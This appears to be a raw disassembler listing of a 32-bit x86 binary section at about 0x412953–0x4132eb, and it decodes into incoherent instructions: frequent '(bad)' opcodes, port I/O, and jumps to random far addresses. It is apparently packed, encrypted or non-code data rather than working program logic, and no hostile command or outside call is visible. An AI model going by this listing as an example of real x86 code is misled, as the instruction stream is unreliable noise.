  412953:	or     BYTE PTR [esi-0x638dfc88],dl
  412959:	adc    DWORD PTR [edx-0x52cf6666],ebp
  41295f:	xor    dl,BYTE PTR [edx-0x5c]
  412962:	adc    ebp,DWORD PTR [ebx+ebp*2-0x28f5db6d]
  412969:	bound  ebp,QWORD PTR [edx+edi*2+0x76]
  41296d:	loop   0x412946
  41296f:	push   0xffffffc6
  412971:	daa    
  412972:	mov    ds:0xdda07682,al
  412977:	stos   BYTE PTR es:[edi],al
  412978:	test   eax,0xc23aa2f5
  41297d:	or     DWORD PTR [ebp-0xd],edx
  412980:	sub    eax,esp
  412982:	push   es
  412983:	fs popf 
  412985:	mov    ds:0xac89bd08,al
  41298a:	out    0x26,al
  41298c:	push   ebp
  41298d:	neg    DWORD PTR [esp+esi*8-0x5e]
  412991:	sbb    al,BYTE PTR [ebx]
  412993:	jmp    0xe90721a2
  412998:	fcom   DWORD PTR [ebp+0x1c]
  41299b:	aaa    
  41299c:	test   BYTE PTR [ebp+ebp*2-0x4fcd5b4d],bh
  4129a3:	popf   
  4129a4:	push   ds
  4129a5:	adc    cl,BYTE PTR [eax]
  4129a7:	jno    0x4129be
  4129a9:	inc    ebx
  4129aa:	push   esp
  4129ab:	inc    ebp
  4129ac:	loope  0x4129e2
  4129ae:	(bad)
  4129b1:	(bad)  
  4129b2:	sbb    al,0x95
  4129b4:	shl    BYTE PTR [eax],0x2c
  4129b7:	mov    edx,0xfa37c019
  4129bc:	inc    edx
  4129bd:	fs mov esp,eax
  4129c0:	call   0x4cff2aeb
  4129c5:	xor    eax,0x25d4fa2e
  4129ca:	fst    QWORD PTR [ebp+0x7e]
  4129cd:	push   esi
  4129ce:	xchg   BYTE PTR [edi+0x1073fac5],dh
  4129d4:	dec    ebp
  4129d5:	sbb    al,0x86
  4129d7:	jbe    0x4129f7
  4129d9:	ins    DWORD PTR es:[edi],dx
  4129da:	add    ch,BYTE PTR [edi]
  4129dc:	out    0x95,eax
  4129de:	in     eax,0xfd
  4129e0:	xchg   edi,eax
  4129e1:	lea    edx,[ecx-0x35]
  4129e4:	pop    ss
  4129e5:	in     al,0x67
  4129e7:	mov    BYTE PTR [ebx+0x45],cl
  4129ea:	into   
  4129eb:	arpl   WORD PTR [ecx+0x49c9c025],ax
  4129f1:	pop    esp
  4129f2:	mov    al,ds:0xff43ac3c
  4129f7:	adc    eax,0xaf6e3601
  4129fc:	sub    eax,0x7322b53d
  412a01:	gs ins BYTE PTR es:[edi],dx
  412a03:	mov    dl,0xec
  412a05:	inc    esp
  412a06:	pop    ebp
  412a07:	jnp    0x412a6d
  412a09:	add    ecx,DWORD PTR [ebp-0x1f]
  412a0c:	adc    BYTE PTR [ebp-0x70],ch
  412a0f:	xchg   esi,eax
  412a10:	inc    ebx
  412a11:	xchg   BYTE PTR [esi],al
  412a13:	cld    
  412a14:	jmp    0xb957:0xa7e71e21
  412a1b:	mov    ebp,0x8b875cf1
  412a20:	aas    
  412a21:	ds push esp
  412a23:	sub    eax,0x134968ee
  412a28:	in     eax,dx
  412a29:	push   eax
  412a2a:	jmp    0x4129cc
  412a2c:	xchg   ebp,eax
  412a2d:	dec    ecx
  412a2e:	imul   BYTE PTR [esi+ebp*2+0x11]
  412a32:	sbb    eax,0x39de73af
  412a37:	fdivr  st,st(4)
  412a39:	push   ds
  412a3a:	push   0x18fa0abd
  412a3f:	repnz es adc eax,0xd4a2046c
  412a46:	push   esp
  412a47:	push   0x2210ca10
  412a4c:	and    ch,BYTE PTR [edi+0x2f]
  412a4f:	in     ax,dx
  412a51:	adc    esp,esp
  412a53:	cmp    BYTE PTR [ebx],dl
  412a55:	fdiv   QWORD PTR [edi-0x9]
  412a58:	in     eax,0x5f
  412a5a:	lock inc ebx
  412a5c:	sub    DWORD PTR [edx+ebp*4],ebp
  412a5f:	adc    al,0xbc
  412a61:	pusha  
  412a62:	mov    bh,al
  412a64:	aas    
  412a65:	pop    ss
  412a66:	jl     0x4129ef
  412a68:	and    BYTE PTR [ebx-0x1c],ah
  412a6b:	and    dh,BYTE PTR [esi+eax*4-0x3f]
  412a6f:	loope  0x412adf
  412a71:	jg     0x412a88
  412a73:	add    eax,DWORD PTR [ebx]
  412a75:	icebp  
  412a76:	(bad)  
  412a77:	pop    edx
  412a78:	aas    
  412a79:	aam    0x29
  412a7b:	fwait
  412a7c:	adc    DWORD PTR [eax+ebx*1],0x5be62f81
  412a83:	mov    cl,0x79
  412a85:	(bad)  
  412a86:	sbb    ch,dl
  412a88:	test   DWORD PTR [ebp-0x3],esp
  412a8b:	or     eax,0x3cf2973d
  412a90:	sbb    eax,0x5500a4df
  412a95:	bound  esp,QWORD PTR [esi+0x6e]
  412a98:	mov    ?,WORD PTR [edi+0x85d6da3]
  412a9e:	jbe    0x412a2b
  412aa0:	xchg   ebp,eax
  412aa1:	imul   ecx,DWORD PTR [esi],0xc9bfc12a
  412aa7:	test   BYTE PTR [eax-0x23ae16a4],0x2
  412aae:	jns    0x412a38
  412ab0:	popf   
  412ab1:	(bad)
  412ab5:	dec    ecx
  412ab6:	mov    bl,0x16
  412ab8:	cld    
  412ab9:	mov    WORD PTR [edi-0x5b821687],ds
  412abf:	lahf   
  412ac0:	imul   ebp,DWORD PTR [ecx+0x7a],0x3218188e
  412ac7:	sub    BYTE PTR [ecx-0x21fb33f1],ch
  412acd:	push   ss
  412ace:	rol    ch,1
  412ad0:	mov    ds:0x22652b69,eax
  412ad5:	adc    al,0x55
  412ad7:	add    BYTE PTR [edx-0x44835ce4],bl
  412add:	adc    BYTE PTR [eax+0x7a],dl
  412ae0:	mov    esp,0x6651d52e
  412ae5:	or     BYTE PTR es:[ebx+0x59c1e0d3],ch
  412aec:	push   ebp
  412aed:	jp     0x412b0f
  412aef:	adc    esi,ecx
  412af1:	xor    eax,ecx
  412af3:	rcl    BYTE PTR [esi],cl
  412af5:	add    BYTE PTR [edi-0x76],ch
  412af8:	inc    edx
  412af9:	das    
  412afa:	das    
  412afb:	popf   
  412afc:	(bad)  
  412afd:	sub    DWORD PTR [edi-0x483a6b1f],ecx
  412b03:	js     0x412b50
  412b05:	sbb    dl,ch
  412b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b08:	sub    DWORD PTR [ebx],0x9f79a807
  412b0e:	vaddss xmm4,xmm4,DWORD PTR [eax]
  412b12:	dec    ebp
  412b13:	cli    
  412b14:	stc    
  412b15:	cld    
  412b16:	cmp    BYTE PTR [esi-0x13df2a5a],al
  412b1c:	call   0xd7a3:0x537cf527
  412b23:	push   es
  412b24:	cwde   
  412b25:	(bad)  
  412b26:	mov    ds:0xc718f6d8,eax
  412b2b:	iret   
  412b2c:	xchg   esp,eax
  412b2d:	imul   esi,ecx,0x7c4de8a8
  412b33:	pop    esp
  412b34:	out    dx,al
  412b35:	pop    ds
  412b36:	aas    
  412b37:	or     eax,0x3387600e
  412b3c:	bound  ecx,QWORD PTR [eax-0x64]
  412b3f:	mov    eax,DWORD PTR [esi+ebx*1-0x36]
  412b43:	outs   dx,BYTE PTR ds:[esi]
  412b44:	push   0xfedcdbd2
  412b49:	xor    ah,0x4f
  412b4c:	sub    al,0x27
  412b4e:	mov    ds:0xedda9a4e,al
  412b53:	mov    bh,0x3
  412b55:	add    DWORD PTR [ecx],esp
  412b57:	jmp    FWORD PTR [esi]
  412b59:	pop    ss
  412b5a:	mov    esi,0xa4b53150
  412b5f:	das    
  412b60:	call   FWORD PTR [ecx]
  412b62:	jno    0x412b7d
  412b64:	mov    al,0x9c
  412b66:	dec    esi
  412b67:	jecxz  0x412b30
  412b69:	lock pushf 
  412b6b:	inc    ecx
  412b6c:	pop    edi
  412b6d:	cmp    ecx,DWORD PTR [ecx-0x55]
  412b70:	imul   DWORD PTR [ecx-0x1a]
  412b73:	sub    cl,BYTE PTR [ecx+0x14fbb938]
  412b79:	inc    ebp
  412b7a:	or     al,0x3f
  412b7c:	repnz pop es
  412b7e:	mov    bh,0xd5
  412b80:	into   
  412b81:	rcr    BYTE PTR [eax+edx*8-0x43],0xf9
  412b86:	dec    eax
  412b87:	stc    
  412b88:	stc    
  412b89:	popf   
  412b8a:	call   0x24d0d2c4
  412b8f:	jns    0x412b4d
  412b91:	js     0x412bee
  412b93:	call   0xfaa5:0x90d80e6
  412b9a:	cmp    ah,BYTE PTR [edx+0x5636ce76]
  412ba0:	mov    edi,0xa46bf335
  412ba5:	mov    ds:0x7be1ff40,al
  412baa:	add    al,0x5e
  412bac:	loop   0x412bd0
  412bae:	jmp    0x412b74
  412bb0:	xchg   ebp,eax
  412bb1:	mov    fs,WORD PTR [ebx+0x9]
  412bb4:	dec    ebp
  412bb5:	out    dx,eax
  412bb6:	out    0xe9,al
  412bb8:	jne    0x412bba
  412bba:	pusha  
  412bbb:	cmp    eax,0x98089372
  412bc0:	dec    esp
  412bc1:	xchg   esi,eax
  412bc2:	jmp    0x335e1c40
  412bc7:	and    al,dl
  412bc9:	lock mov cl,0x99
  412bcc:	cmp    eax,0xabb7030b
  412bd1:	loope  0x412c0d
  412bd3:	ds arpl sp,ax
  412bd6:	sub    eax,0xe04a1073
  412bdb:	loop   0x412be8
  412bdd:	(bad)  
  412bde:	mov    ch,0x5e
  412be0:	int    0xe7
  412be2:	test   edi,esp
  412be4:	sub    DWORD PTR cs:[ebx],esi
  412be7:	mov    ch,0x35
  412be9:	cli    
  412bea:	ins    BYTE PTR es:[edi],dx
  412beb:	fsubr  DWORD PTR [edi]
  412bed:	jno    0x412c16
  412bef:	(bad)  
  412bf1:	fidivr DWORD PTR gs:[esi+0x639730ee]
  412bf8:	lods   eax,DWORD PTR ds:[esi]
  412bf9:	mov    al,ds:0xeb1c03a2
  412bfe:	std    
  412bff:	cmp    al,cl
  412c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c02:	mov    cl,0x76
  412c04:	in     al,dx
  412c05:	and    BYTE PTR [eax-0x5d0085ad],ah
  412c0b:	xchg   ebp,eax
  412c0c:	jg     0x412c00
  412c0e:	push   es
  412c0f:	xor    DWORD PTR [edi-0x5b],edx
  412c12:	xlat   BYTE PTR ds:[ebx]
  412c13:	inc    esi
  412c15:	mov    edi,0xb3de9d0a
  412c1a:	xlat   BYTE PTR ds:[ebx]
  412c1b:	or     ch,0xc6
  412c1e:	test   eax,0xee99f00b
  412c23:	mov    eax,0xc036c56c
  412c28:	push   ss
  412c29:	or     al,dl
  412c2b:	fcom   st(3)
  412c2d:	ins    BYTE PTR es:[edi],dx
  412c2e:	outs   dx,BYTE PTR ds:[esi]
  412c2f:	mov    al,ds:0xee7b76d
  412c34:	jmp    0x1e44b486
  412c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c3a:	mov    eax,ds:0xfc2bb52c
  412c3f:	sti    
  412c40:	rcl    BYTE PTR [esi-0x3c],cl
  412c43:	(bad)  
  412c44:	or     esi,DWORD PTR [ecx]
  412c46:	idiv   BYTE PTR [edx]
  412c48:	jnp    0x412be0
  412c4a:	(bad)  
  412c4b:	jmp    0xea6dd8a8
  412c50:	dec    ebp
  412c51:	rol    eax,0x14
  412c54:	sar    BYTE PTR [eax+0x68d4104c],1
  412c5a:	lods   al,BYTE PTR ds:[esi]
  412c5b:	push   ebx
  412c5c:	jae    0x412bf7
  412c5e:	jmp    DWORD PTR [edx]
  412c60:	and    eax,0xf1208155
  412c65:	outs   dx,BYTE PTR ds:[esi]
  412c66:	add    eax,0xffffffe1
  412c69:	hlt    
  412c6a:	fisttp DWORD PTR [esi-0x34]
  412c6d:	shl    DWORD PTR [edi-0x1b],0x28
  412c71:	popa   
  412c72:	test   al,0xb9
  412c74:	(bad)  
  412c76:	xchg   esi,eax
  412c77:	sub    DWORD PTR [eax-0x4e],esi
  412c7a:	mov    bl,0x62
  412c7c:	sub    al,0xd3
  412c7e:	jne    0x412c0e
  412c80:	lods   eax,DWORD PTR ds:[esi]
  412c81:	stos   DWORD PTR es:[edi],eax
  412c82:	lea    esp,[eax]
  412c84:	stc    
  412c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c86:	daa    
  412c87:	or     bh,BYTE PTR [edi+eax*4+0x10929f87]
  412c8e:	jmp    0x3a3d:0xa349ee2e
  412c95:	mov    dl,0x46
  412c97:	jno    0x412d08
  412c99:	and    DWORD PTR [edx+0x7c085c2d],ecx
  412c9f:	xlat   BYTE PTR ds:[ebx]
  412ca0:	cmp    DWORD PTR [ecx+0x79],ebp
  412ca3:	outs   dx,BYTE PTR ds:[esi]
  412ca4:	repz (bad)
  412ca7:	aaa    
  412ca8:	scas   al,BYTE PTR es:[edi]
  412ca9:	pop    es
  412caa:	add    bl,BYTE PTR [edi+0x14]
  412cad:	push   esp
  412cae:	fnstenv [eax+ecx*1]
  412cb1:	jecxz  0x412d24
  412cb3:	fnstenv [ebx-0x289cfa6a]
  412cb9:	jmp    0x246a:0x3b2e5c44
  412cc0:	inc    eax
  412cc1:	rcr    DWORD PTR [ebx+0x3a],0xd7
  412cc5:	dec    edx
  412cc6:	mov    ebx,0x676c6c4b
  412ccb:	inc    ecx
  412ccc:	test   eax,0xc09e702f
  412cd1:	add    eax,0x2686ed32
  412cd6:	sub    al,0x2f
  412cd8:	(bad)  
  412cd9:	jbe    0x412c9a
  412cdb:	cmp    DWORD PTR [esi-0x17],0x7
  412cdf:	(bad)  
  412ce0:	lahf   
  412ce1:	mov    BYTE PTR [edi-0x23],cl
  412ce4:	xchg   esi,eax
  412ce5:	dec    esp
  412ce6:	and    DWORD PTR [edx-0x9949201],ebx
  412cec:	out    0xe,al
  412cee:	xor    BYTE PTR [eax+0x2c22dc70],al
  412cf4:	add    eax,0x941cc04
  412cf9:	cmp    al,0x43
  412cfb:	stos   BYTE PTR es:[edi],al
  412cfc:	and    al,0xb3
  412cfe:	rcr    DWORD PTR [edx+0x77],0xfa
  412d02:	sub    ebx,eax
  412d04:	in     eax,dx
  412d05:	add    DWORD PTR [ecx-0x1d],ebx
  412d08:	sub    edx,DWORD PTR [ecx+0x6eeaa718]
  412d0e:	les    esi,FWORD PTR [ebx+0x8]
  412d11:	lock ret 
  412d13:	jne    0x412d15
	...
  412edd:	add    BYTE PTR [eax],al
  412edf:	add    BYTE PTR [esi-0x77],bl
  412ee2:	add    eax,0x7feed766
  412ee7:	mov    ecx,0x4f6277d8
  412eec:	sub    eax,DWORD PTR [eax-0x2d]
  412eef:	daa    
  412ef0:	test   DWORD PTR [ebx+0x1],0x71e00
  412ef7:	add    BYTE PTR [edi+esi*8-0x17087da8],al
  412efe:	jle    0x412edf
  412f00:	inc    ecx
  412f01:	pop    edx
  412f02:	mov    ah,0x2c
  412f04:	js     0x412f82
  412f06:	jmp    0x412f13
  412f08:	pop    esp
  412f09:	scas   al,BYTE PTR es:[edi]
  412f0a:	ja     0x412f2e
  412f0c:	or     al,0xec
  412f0e:	retf   
  412f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f10:	sub    DWORD PTR [ebx-0x14],0x71
  412f14:	loopne 0x412ec3
  412f16:	dec    edi
  412f17:	cld    
  412f18:	xor    eax,0xbb67380c
  412f1d:	out    dx,eax
  412f1e:	lea    ebx,[edx+edi*4-0x6f61e057]
  412f25:	cli    
  412f26:	jne    0x412f7a
  412f28:	repnz repnz in al,dx
  412f2b:	sub    BYTE PTR [edx+eiz*8-0x44c9e630],0xdd
  412f33:	push   es
  412f34:	mov    bh,0x10
  412f36:	mov    al,cl
  412f38:	je     0x412f7d
  412f3a:	push   edx
  412f3b:	pop    edi
  412f3c:	fsub   DWORD PTR [ebx+0x18]
  412f3f:	adc    eax,0xcfd88f28
  412f44:	push   eax
  412f45:	sbb    al,0x33
  412f47:	add    edx,DWORD PTR [ebx+0x53]
  412f4a:	xchg   edi,eax
  412f4b:	mov    edx,0x9d613f3d
  412f50:	jno    0x412f95
  412f52:	jg     0x412fd2
  412f54:	dec    edi
  412f55:	sahf   
  412f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f57:	pop    ebx
  412f58:	in     eax,dx
  412f59:	ficomp WORD PTR [esi-0x15]
  412f5c:	add    al,0x29
  412f5e:	es mov edx,0x657c6a84
  412f64:	cmp    esi,DWORD PTR [eax+0x46]
  412f67:	rol    DWORD PTR [eax],cl
  412f69:	and    DWORD PTR [ebp-0x4a9b9dc1],eax
  412f6f:	mov    ch,0xf8
  412f71:	push   ecx
  412f72:	sbb    esi,DWORD PTR [edx]
  412f74:	add    al,0xd4
  412f76:	icebp  
  412f77:	sub    BYTE PTR [edi+0x5d],ah
  412f7a:	(bad)  
  412f7b:	cmp    esi,DWORD PTR [eax+0xb]
  412f7e:	je     0x412fca
  412f80:	rcr    dh,1
  412f82:	push   esi
  412f83:	jp     0x412fd9
  412f85:	aad    0xd9
  412f87:	ins    DWORD PTR es:[edi],dx
  412f88:	pop    ebp
  412f89:	sar    BYTE PTR [ecx+0x4b],cl
  412f8c:	fcmovb st,st(7)
  412f8e:	mov    al,0xd2
  412f90:	ret    0xeff7
  412f93:	loop   0x412f2b
  412f95:	jne    0x412fe4
  412f97:	dec    edi
  412f98:	pop    esp
  412f99:	aas    
  412f9a:	mov    ecx,0xa3551ef7
  412f9f:	daa    
  412fa0:	xor    al,0x1c
  412fa2:	mov    WORD PTR [eax+ebx*8-0x1710eff],ds
  412fa9:	add    bl,ch
  412fab:	or     al,0xc5
  412fad:	xchg   ebx,eax
  412faf:	stc    
  412fb0:	sahf   
  412fb1:	loope  0x41300d
  412fb3:	cmp    al,BYTE PTR [edx-0x52]
  412fb6:	jge    0x412f56
  412fb8:	push   ss
  412fb9:	dec    ebp
  412fbb:	add    eax,0x98837b53
  412fc0:	test   DWORD PTR [edi],0x241c050d
  412fc6:	retf   
  412fc7:	or     eax,0x71e2ea1b
  412fcc:	imul   ebx,DWORD PTR [edx],0xfabc9897
  412fd2:	sub    al,0x38
  412fd4:	xchg   DWORD PTR [esi+0x3f3efb49],edx
  412fda:	int3   
  412fdb:	ret    
  412fdc:	jl     0x41302b
  412fde:	popf   
  412fdf:	add    bh,BYTE PTR [esi+0x30]
  412fe2:	data16 aaa 
  412fe4:	sar    BYTE PTR [eax],0x5b
  412fe7:	add    BYTE PTR [ebx-0x6c636708],dl
  412fed:	jmp    0x412f74
  412fef:	cli    
  412ff0:	outs   dx,BYTE PTR ds:[esi]
  412ff1:	or     al,0x8d
  412ff3:	jg     0x412f90
  412ff5:	nop
  412ff6:	jge    0x413036
  412ff8:	and    cl,BYTE PTR [edi]
  412ffa:	pushf  
  412ffb:	sub    al,0xfb
  412ffd:	or     edx,DWORD PTR [eax-0x1be93a1c]
  413003:	test   BYTE PTR [edx-0x1e],al
  413006:	call   0xd416:0x8b701364
  41300d:	retf   
  41300e:	sbb    eax,DWORD PTR [esp+ebp*1-0x17]
  413012:	jae    0x413075
  413014:	dec    edi
  413015:	add    BYTE PTR [ebx+0x4af828b0],0x60
  41301c:	cdq    
  41301d:	jns    0x412fc0
  41301f:	add    DWORD PTR [ebx-0x16],esp
  413022:	add    bl,dh
  413024:	out    0x11,al
  413026:	fistp  DWORD PTR [eax]
  413028:	push   cs
  413029:	add    BYTE PTR [ebx-0x7a142212],dl
  41302f:	js     0x4130aa
  413031:	nop
  413032:	jg     0x41305f
  413034:	imul   ecx,DWORD PTR [esi+esi*4],0x24027a4e
  41303b:	sbb    dl,BYTE PTR [edi+0x67a2f400]
  413041:	add    al,0x72
  413043:	pop    ss
  413044:	jae    0x41303d
  413046:	loop   0x413019
  413048:	in     al,dx
  413049:	adc    edi,DWORD PTR [esi+0x2c]
  41304c:	inc    esi
  41304d:	cmc    
  41304e:	shl    ch,0xe7
  413051:	xor    bl,BYTE PTR [ebx-0x26]
  413054:	jno    0x413046
  413056:	aad    0x7a
  413058:	int    0x33
  41305a:	and    bh,BYTE PTR [esi+0x6b836f75]
  413060:	sub    al,0x6f
  413062:	popf   
  413063:	dec    edi
  413064:	adc    eax,0x4ebd7d56
  413069:	int    0x4c
  41306b:	stos   BYTE PTR es:[edi],al
  41306c:	add    edi,eax
  41306e:	cs xor edx,esp
  413071:	(bad)  
  413073:	lea    ebx,[ebp-0x346daa61]
  413079:	js     0x41300f
  41307b:	(bad)  
  41307c:	dec    esi
  41307d:	mov    bl,0x5f
  41307f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413080:	add    DWORD PTR [ecx-0x58],edx
  413083:	fimul  DWORD PTR [ebx-0x12]
  413086:	adc    al,0x9f
  413088:	jae    0x41300d
  41308a:	inc    ax
  41308c:	les    edi,FWORD PTR [ecx+0x75]
  41308f:	dec    ebp
  413090:	jno    0x41305a
  413092:	push   0xc6ed92a5
  413097:	xchg   ebp,eax
  413098:	fwait
  413099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309a:	dec    ebx
  41309b:	call   0x2241:0x7d09354d
  4130a2:	ins    BYTE PTR es:[edi],dx
  4130a3:	cmp    eax,0xd12beb43
  4130a8:	sub    DWORD PTR [eax],esp
  4130aa:	pushf  
  4130ab:	mov    esi,0xc720736d
  4130b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b1:	clc    
  4130b2:	xchg   edx,eax
  4130b3:	mov    dl,0x0
  4130b5:	mov    db2,esp
  4130b8:	rcr    BYTE PTR [bp+si+0x5f],1
  4130bc:	pop    ds
  4130bd:	(bad)
  4130c2:	(bad)  
  4130c3:	mov    esp,0xf6db8996
  4130c8:	imul   ebx,DWORD PTR [edi+0x2377f9c5],0x77
  4130cf:	jns    0x413075
  4130d1:	sub    esi,DWORD PTR [esi-0x45909661]
  4130d7:	out    dx,eax
  4130d8:	fidiv  WORD PTR [esi+edi*8+0x76ae484e]
  4130df:	dec    eax
  4130e0:	(bad)  
  4130e1:	popf   
  4130e2:	xchg   ecx,eax
  4130e3:	ds pop ds
  4130e5:	inc    eax
  4130e6:	out    0x82,al
  4130e8:	cdq    
  4130e9:	or     BYTE PTR [esi-0x54],0x1a
  4130ed:	inc    eax
  4130ee:	xor    ecx,DWORD PTR [edx]
  4130f0:	daa    
  4130f1:	and    al,ah
  4130f3:	mov    eax,ds:0x24895d93
  4130f8:	fldenv [ecx+0xfa23df2]
  4130fe:	adc    ah,BYTE PTR [ebx]
  413100:	idiv   BYTE PTR [eax]
  413102:	mov    dl,0xd6
  413104:	test   eax,0xd7c6629f
  413109:	pop    edx
  41310a:	sar    BYTE PTR [eax],1
  41310c:	or     DWORD PTR [ecx],edx
  41310e:	dec    edx
  41310f:	mov    DWORD PTR [eax-0x24],eax
  413112:	cs jbe 0x4130b7
  413115:	outs   dx,DWORD PTR ds:[esi]
  413116:	xor    esi,esi
  413118:	(bad)  
  41311a:	jbe    0x4130c3
  41311c:	xchg   esi,eax
  41311d:	js     0x413177
  41311f:	push   es
  413120:	enter  0x2e94,0xc
  413124:	fs je  0x4130f3
  413127:	push   ds
  413128:	dec    edi
  413129:	pushf  
  41312a:	sub    eax,0x49f9bbb5
  41312f:	rcl    BYTE PTR [ebp+0x1ba0be43],1
  413135:	push   eax
  413136:	cmp    eax,0xae786c69
  41313b:	xlat   BYTE PTR ds:[ebx]
  41313c:	mov    dl,0x8f
  41313e:	xchg   esp,eax
  41313f:	mov    esp,0x4a87bd0c
  413144:	test   al,0x24
  413146:	mov    eax,ds:0x7ca5f848
  41314b:	rcl    BYTE PTR [ebx+0x38],0x78
  41314f:	mov    bh,0x93
  413151:	cld    
  413152:	mov    edx,0xefd9ff67
  413157:	xchg   BYTE PTR [ecx+0x21],dh
  41315a:	in     eax,0x60
  41315c:	loopne 0x4131aa
  41315e:	sbb    al,0xe0
  413160:	push   ds
  413161:	mov    BYTE PTR [edi-0x10],0x33
  413165:	mov    al,0x51
  413167:	into   
  413168:	ss in  al,0x4a
  41316b:	mov    edx,0xd7ac7248
  413170:	out    0x3d,eax
  413172:	scas   al,BYTE PTR es:[edi]
  413173:	push   es
  413174:	mov    WORD PTR [edi-0x16],cs
  413177:	fs aaa 
  413179:	gs std 
  41317b:	pusha  
  41317c:	daa    
  41317d:	jge    0x4131b0
  41317f:	push   eax
  413180:	scas   al,BYTE PTR es:[edi]
  413181:	jne    0x413169
  413183:	xor    ah,dl
  413185:	scas   al,BYTE PTR es:[edi]
  413186:	lods   eax,DWORD PTR ds:[esi]
  413187:	add    DWORD PTR [ebx],ebp
  413189:	inc    ebx
  41318a:	pop    edi
  41318b:	sbb    ebp,DWORD PTR [ecx+0x6d]
  41318e:	jle    0x4131ef
  413190:	push   esi
  413191:	dec    esp
  413192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413193:	das    
  413194:	add    al,0x60
  413196:	aas    
  413197:	mov    bl,0xcf
  413199:	jmp    0x413157
  41319b:	pop    edi
  41319c:	or     ecx,eax
  41319e:	or     eax,0xfa230bb5
  4131a3:	mov    ds:0xe380ccba,al
  4131a8:	adc    al,0x28
  4131aa:	pop    eax
  4131ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131ac:	sub    eax,0x801eaa4
  4131b1:	jnp    0x413141
  4131b3:	adc    edi,edx
  4131b5:	jecxz  0x41316e
  4131b7:	dec    BYTE PTR [edx-0x4c]
  4131ba:	ins    BYTE PTR es:[edi],dx
  4131bb:	arpl   WORD PTR [esi-0x56],si
  4131be:	xor    al,0x28
  4131c0:	inc    ecx
  4131c1:	ss ret 
  4131c3:	call   0x705e:0xbb52ad7e
  4131ca:	daa    
  4131cb:	push   esi
  4131cc:	fisub  WORD PTR [edx+0x53]
  4131cf:	js     0x41320a
  4131d1:	push   ds
  4131d2:	shl    DWORD PTR [esi],0x34
  4131d5:	shl    DWORD PTR [esi-0x2bdd075a],1
  4131db:	push   0xffffffec
  4131dd:	xchg   esi,eax
  4131de:	dec    edi
  4131df:	mov    al,0xbf
  4131e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131e2:	popa   
  4131e3:	xor    BYTE PTR [edi-0x56385a3d],dh
  4131e9:	dec    ebx
  4131ea:	popf   
  4131eb:	daa    
  4131ec:	and    BYTE PTR [edx],bl
  4131ee:	adc    eax,0xae3b5fd6
  4131f3:	mov    esp,0xaf68801b
  4131f8:	test   BYTE PTR [esi],al
  4131fa:	es (bad) 
  4131fc:	cmp    eax,0xce1ee152
  413201:	bound  esp,QWORD PTR [edi-0x73]
  413204:	jl     0x4131b1
  413206:	scas   eax,DWORD PTR es:[edi]
  413207:	pop    edi
  413208:	cmc    
  413209:	push   ss
  41320a:	into   
  41320b:	(bad)  
  41320d:	pusha  
  41320e:	out    dx,eax
  41320f:	lods   eax,DWORD PTR ds:[esi]
  413210:	cli    
  413211:	mov    al,0x5
  413213:	or     DWORD PTR [edx-0x80],edx
  413216:	inc    ecx
  413217:	test   edx,ebx
  413219:	loopne 0x4131a9
  41321b:	or     BYTE PTR [ecx+edi*4-0x7fda1498],dl
  413222:	mov    esi,0x9bc4219e
  413227:	jmp    0xe83f0794
  41322c:	je     0x413295
  41322e:	jmp    0x4132a9
  413230:	aam    0x4
  413232:	shufps xmm5,XMMWORD PTR [eax],0x88
  413236:	jb     0x413281
  413238:	mov    bh,0x3
  41323a:	cmp    esp,DWORD PTR [ebx]
  41323c:	sub    edx,DWORD PTR [edi-0x33]
  41323f:	dec    edi
  413240:	mov    ebx,?
  413242:	ja     0x413242
  413244:	pop    ebp
  413245:	dec    ebp
  413246:	jne    0x41327d
  413248:	xchg   edi,eax
  413249:	daa    
  41324a:	dec    BYTE PTR [edx+0x341f2295]
  413250:	adc    BYTE PTR [edx-0x7a3c862b],cl
  413256:	ss inc edx
  413258:	je     0x4131ef
  41325a:	sub    BYTE PTR [edi-0x48e1f39],ch
  413260:	shr    DWORD PTR [edi],1
  413262:	into   
  413263:	arpl   WORD PTR [ecx+edi*8-0x12],si
  413267:	lea    edx,[ebx]
  413269:	jmp    0xff22:0x86f4ffaf
  413270:	inc    edx
  413271:	ret    0xc64a
  413274:	pop    es
  413275:	mov    BYTE PTR [ebx],ah
  413277:	push   0x74
  413279:	jmp    0x41327f
  41327b:	lock or DWORD PTR [edx+0x50],esi
  41327f:	pop    edx
  413280:	cli    
  413281:	xchg   edi,eax
  413282:	pop    eax
  413283:	std    
  413284:	ds ss dec ebx
  413287:	fimul  DWORD PTR [edx]
  413289:	adc    BYTE PTR [ecx+0xee301f],0x6
  413290:	frstor [ebx+0x33daef47]
  413296:	push   ds
  413297:	out    dx,al
  413298:	mov    edi,0xfe83431a
  41329d:	dec    edi
  41329e:	dec    edi
  41329f:	and    DWORD PTR [edi],0xffffffdf
  4132a2:	and    dl,cl
  4132a4:	jl     0x4132e4
  4132a6:	jmp    0x4132ad
  4132a8:	aaa    
  4132a9:	mov    ah,0xf4
  4132ab:	or     eax,0xb4c74d96
  4132b0:	rcl    BYTE PTR [ebx+0x5c],1
  4132b3:	jae    0x4132ee
  4132b5:	ret    0xfb03
  4132b8:	cmp    edi,DWORD PTR [ebp-0x1d]
  4132bb:	shl    BYTE PTR [ecx-0x3b],1
  4132be:	fwait
  4132bf:	cli    
  4132c0:	daa    
  4132c1:	frstor [ecx+0x12]
  4132c4:	sub    BYTE PTR [ebp-0x69625dc8],ah
  4132ca:	mov    eax,ds:0x7d7673af
  4132cf:	lock enter 0x891a,0x37
  4132d4:	xchg   ecx,eax
  4132d5:	xchg   edi,eax
  4132d6:	xor    esi,edi
  4132d8:	mov    esp,0xe4c0142
  4132dd:	pop    ebx
  4132de:	nop
  4132df:	pop    edx
  4132e0:	pop    ss
  4132e1:	shr    DWORD PTR [ebx+0x7eca814c],1
  4132e7:	dec    edi
  4132e8:	xor    edi,edi
  4132ea:	xchg   esp,eax
  4132eb:	test   al,0xc3
